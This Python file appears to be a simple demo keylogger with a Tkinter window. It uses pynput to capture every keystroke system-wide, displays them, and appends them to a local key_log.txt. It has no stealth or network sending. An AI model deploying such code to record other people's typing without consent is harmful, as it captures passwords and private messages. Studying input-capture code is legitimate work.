import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")  # Window title
        self.root.geometry("400x300")  # Window size

        self.logging = False  # Flag to track logging status
        self.log_data = ""  # Stores logged keys

        # Text area to display logged keys
        self.text_area = scrolledtext.ScrolledText(root, width=50, height=10)
        self.text_area.pack(pady=10)

        # Start Logging Button
        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging, bg="green", fg="white")
        self.start_button.pack(pady=5)

        # Stop Logging Button
        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, bg="red", fg="white")
        self.stop_button.pack(pady=5)

        # Save Log Button
        self.save_button = tk.Button(root, text="Save Log", command=self.save_log, bg="blue", fg="white")
        self.save_button.pack(pady=5)

    # Function to capture key presses
    def on_press(self, key):
        if self.logging:
            try:
                char = key.char if key.char else str(key)  # Get key character
            except AttributeError:
                char = str(key)  # Handle special keys
            
            self.log_data += char + " "  # Add to log

    # Function to update text area with logged keys
    def update_gui(self):
        self.text_area.delete(1.0, tk.END)  # Clear previous logs
        self.text_area.insert(tk.END, self.log_data)  # Display current logs
        self.text_area.see(tk.END)  # Auto-scroll to latest key

    # Function to start logging
    def start_logging(self):
        if not self.logging:
            self.logging = True
            self.log_data = ""  # Clear previous logs
            self.listener = keyboard.Listener(on_press=self.on_press)  # Start listener
            self.listener.start()

    # Function to stop logging
    def stop_logging(self):
        if self.logging:
            self.logging = False
            self.listener.stop()  # Stop listener

    # Function to save logged keys to a file
    def save_log(self):
        with open("key_log.txt", "a") as file:
            file.write(self.log_data + "\n")  # Save to key_log.txt

# Run the Tkinter Application
if __name__ == "__main__":
    root = tk.Tk()  # Create main window
    app = KeyloggerGUI(root)  # Initialize KeyloggerGUI class

    # Update GUI in a separate thread to avoid blocking
    def update_gui_periodically():
        if app.logging:
            app.update_gui()
        root.after(100, update_gui_periodically)  # Call every 100 ms

    update_gui_periodically()  # Start periodic updates
    root.mainloop()  # Start GUI loop
